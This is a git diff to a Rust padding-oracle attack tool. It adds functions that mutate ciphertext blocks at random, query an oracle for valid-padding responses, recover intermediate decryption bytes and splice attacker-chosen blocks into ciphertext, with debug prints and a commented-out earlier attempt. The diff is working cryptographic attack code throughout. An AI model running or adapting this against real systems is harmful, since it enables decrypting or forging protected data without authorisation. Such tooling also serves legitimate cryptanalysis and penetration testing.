@@ -4,16 +4,172 @@ use std::sync::{
 };
 
 use futures::future::join_all;
+use rand::{Rng, random_range, seq::IteratorRandom};
 use tokio::sync::{Mutex, mpsc::Sender};
 
 use crate::{
     crypt::{
         MessageForwarder, calc_intermediate_vector,
-        detector::{Detector, Oracle, SimpleDetector},
+        detector::{DETECT, Detector, IntermediateDetector, SimpleDetector, calculate_byte, decrypt_intermediate_block},
     },
     errors::DecryptError,
-    helper::{Config, Messages},
+    helper::{Config, Messages}, oracle::Oracle, print::fmt_bytes_custom,
 };
+
+struct MakePrimeOptions {
+    high_entropy: Option<bool>,
+    fixed_blk_pos: Option<Vec<usize>>,
+    valid_bytes: Option<Vec<(usize, Vec<u8>)>>
+}
+impl MakePrimeOptions {
+    fn new() -> Self{
+        return MakePrimeOptions { high_entropy: None, fixed_blk_pos: None, valid_bytes: None };
+    }
+}
+
+async fn _make_prime(detector: &IntermediateDetector, ct: &[u8],ct_prefix: &[u8], ct_suffix:&[u8], retry: u16, options: Option<MakePrimeOptions>) -> Option<Vec<u8>>{
+        let mut ct_prime = ct.to_vec();
+        let mut success = false;
+        let options = options.unwrap_or(MakePrimeOptions::new());
+        let high_entropy = options.high_entropy.unwrap_or(false);
+        let fixed_blk_pos = options.fixed_blk_pos.unwrap_or(vec![]);
+        let byte_options = options.valid_bytes.unwrap_or(vec![]);
+        for _ in 0..retry{
+            // make small modification to ct_prime and check if valid
+            if byte_options.len() > 0{
+                for (pos, bytes) in byte_options.clone().into_iter().filter(|(p,_)| !fixed_blk_pos.contains(p)){
+                    ct_prime[pos] = bytes.into_iter().choose(&mut rand::rng()).unwrap();
+                }
+            }else{
+                let mut pos_array = (0..ct.len()).filter(|c| !fixed_blk_pos.contains(c)).collect::<Vec<usize>>();
+                if !high_entropy{
+                    pos_array = vec![pos_array.into_iter().choose(&mut rand::rng()).unwrap()];
+                }
+                for pos in pos_array{
+                    ct_prime[pos] = ct_prime[pos] ^ (1 << random_range(0..8));
+                }
+            }
+            let full_ct = [ct_prefix, ct_prime.as_slice(), ct_suffix].concat();
+            success = detector.check(&full_ct).await.is_ok_and(|d| d == DETECT::OUTLIER);
+            if success{
+                break;
+            }
+        }
+        if success{
+            return Some(ct_prime);
+        }
+        return None;
+}
+
+pub async fn build_cradle(detector: &IntermediateDetector, cradle_block: &[u8], ct_prefix: &[u8], ct_suffix:&[u8], retry:u16) -> Option<(Vec<u8>, Vec<u8>)>{
+    let blk_size = cradle_block.len();
+    // Find [c1’] such that [c1][c1’][c2][c3][c4] is valid
+    let c1 = ct_prefix[ct_prefix.len()-blk_size..].to_vec();
+    let res = _make_prime(detector, &c1,ct_prefix, ct_suffix, retry,None).await;
+    if res.is_none(){
+        return None;
+    }
+    let mut c1_prime = res.unwrap();
+
+    let mut fixed_pos = vec![];
+    let mut byte_options = vec![];
+    let mut valid_bytes = vec![];
+    let bad_chars = vec![ 0x00, 0x01, 0x02, 0x03, 0x22];
+    let mut c2_prime = vec![];
+    while !c1_prime.eq(cradle_block){
+        //Find second [c1’] such that [c1][c1’][c1’][c2][c3][c4] is valid
+        let c2 = c1.clone();
+        //c2[1] = 0xa0;
+        let res = _make_prime(detector, &c2,&[ct_prefix, &c1_prime].concat(),ct_suffix, retry,None).await;
+        if res.is_none(){
+            return None;
+        }
+        c2_prime = res.unwrap();
+        println!("Found Valid c2_prime!");
+        let mut found_intermediate_block_bytes = vec![];
+        // only decrypt bytes that need to be decrypted for insertion
+        for pos in (0..blk_size).filter(|p| !fixed_pos.contains(p)){
+            if let Some((byte, found_valid_bytes)) = calculate_byte(detector, pos, &bad_chars, &c1_prime, &c2_prime, ct_prefix, ct_suffix).await{
+                valid_bytes.append(&mut found_valid_bytes.into_iter().filter(|v| !valid_bytes.contains(v)).collect::<Vec<u8>>());
+                println!("found intermediate block byte: {:2x?}", byte);
+                let intermediate_block_byte = byte ^ c1_prime[pos];
+                found_intermediate_block_bytes.push((pos, intermediate_block_byte));
+            }
+        }
+        for (pos, byte) in found_intermediate_block_bytes{
+            // if inserting cradle block byte into c1_prime at pos would create a valid byte, then do it
+            if valid_bytes.contains(&(byte ^ cradle_block[pos])){
+                c1_prime[pos] = cradle_block[pos];
+                fixed_pos.push(pos);
+            }else{
+                byte_options.push((pos, valid_bytes.iter().map(|v| *v ^ byte).collect::<Vec<u8>>()));
+            }
+        }
+        // if we're not finished and we have some unfixed bytes in c1_prime, find a c1_prime that's valid
+        if !c1_prime.eq(cradle_block){
+            //leave a few unfixed positions so we have enough room to find a new c1_prime
+            if blk_size - fixed_pos.len() < 3{
+                let diff = blk_size - fixed_pos.len();
+                fixed_pos = fixed_pos.clone()[..fixed_pos.len()-diff].to_vec();
+            }
+            if let Some(res) = _make_prime(detector, &c1_prime, ct_prefix, &[&c2_prime, ct_suffix].concat(), retry, Some(MakePrimeOptions { high_entropy: None, fixed_blk_pos: Some(fixed_pos.clone()), valid_bytes: Some(byte_options.clone()) })).await{
+                c1_prime = res;
+                println!("found new c1_prime: {:2x?}", c1_prime);
+            }else{
+                println!("could not find new valid c1_prime");
+            }
+        }
+        println!("c1_prime: {:2x?}", c1_prime);
+        println!("cradle__: {:2x?}", cradle_block);
+    }
+
+    //build a list of multiple c1_primes
+    let res = _make_prime(detector, &c1,ct_prefix, ct_suffix, retry,None).await;
+    if res.is_none(){
+        return None;
+    }
+    let c1_prime_init = res.unwrap();
+
+    let c2 = c1.clone();
+    let res = _make_prime(detector, &c2,&[ct_prefix, &c1_prime_init].concat(),ct_suffix, retry,None).await;
+    if res.is_none(){
+        return None;
+    }
+    let c2_prime_init = res.unwrap();
+
+
+    let mut valid_prime;
+    loop{
+        let res = _make_prime(detector, &c1_prime_init, ct_prefix, &[&c2_prime_init, ct_suffix].concat(), retry,None).await;
+        if res.is_none(){
+            return None;
+        }
+        valid_prime = res.unwrap();
+        if detector.check(&[ct_prefix, &valid_prime, &c1_prime, &c2_prime, ct_suffix].concat()).await.is_ok_and(|d| d == DETECT::OUTLIER){
+            break;
+        }
+    }
+    // // get the intermediate block as-is
+    // let (pt,valid_bytes) = decrypt_intermediate_block(detector, &bad_chars, &vec![0u8;blk_size], &c1_prime, &c2_prime, ct_prefix, &ct_suffix, blk_size).await;
+    
+    // for (i, b) in pt.iter().enumerate(){
+    //     if !valid_bytes.contains(&(cradle_block[i] ^ *b)){
+    //         println!("Would create invalid byte {} at: {}", cradle_block[i] ^ b, i);
+    //         byte_options.push((i, valid_bytes.iter().map(|v| *v ^ *b).collect::<Vec<u8>>()));
+    //     }else if (blk_size - fixed_pos.len()) > 1{ // leave enough unfixed positions that we can still find another c1_prime after setting the bytes
+    //         fixed_pos.push(i);
+    //         c1_prime[i] = cradle_block[i];
+    //     }else{
+    //         byte_options.push((i, valid_bytes.iter().map(|v| *v ^ *b).collect::<Vec<u8>>()));
+    //         println!("here {}", fixed_pos.len());
+    //     }
+    // }
+    // let c1_prime = _make_prime(detector, &c1_prime, ct_prefix, &[&c2_prime, ct_suffix].concat(), retry,Some(MakePrimeOptions { high_entropy: Some(true), fixed_blk_pos: Some(fixed_pos), valid_bytes: None })).await.unwrap();
+    // println!("{}",fmt_bytes_custom(cradle_block));
+    // println!("{}",fmt_bytes_custom(&c1_prime));
+    // println!("{:?}",detector.check(&[ct_prefix, &c1_prime, &c2_prime, ct_suffix].concat()).await);
+    return Some((valid_prime, c2_prime))
+}
 
 pub async fn padding_oracle_decrypt<O: Oracle>(
     ct: &[u8],
@@ -29,6 +185,7 @@ pub async fn padding_oracle_decrypt<O: Oracle>(
         let _ = tx.send(Messages::OracleConfirmed).await;
         return _padding_decrypt(ct, classic_detector, retry, tx, blk_size).await;
     }
+    let _ = tx.send(Messages::NoOracleFound).await;
     Err(DecryptError::CouldNotDecryptClassic(
         "No padding oracle found".into(),
     ))
